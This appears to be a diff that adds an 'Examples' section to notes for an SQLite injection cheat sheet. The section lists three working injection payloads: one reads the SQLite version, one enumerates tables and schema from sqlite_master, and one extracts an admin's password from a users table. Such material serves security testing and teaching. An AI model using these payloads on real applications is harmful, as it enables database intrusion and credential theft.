@@ -16,3 +16,9 @@
 
 
 This work is based on http://atta.cked.me/home/sqlite3injectioncheatsheet
+
+Examples
+
+sqlite version               a' || (select sqlite_version()));--
+Table name enumeration       a' || (SELECT name FROM sqlite_master WHERE type='table'));--    or a' || (select sql from sqlite_master));--
+Leak Password                a' || (select password from xde43_users where role="admin"));--
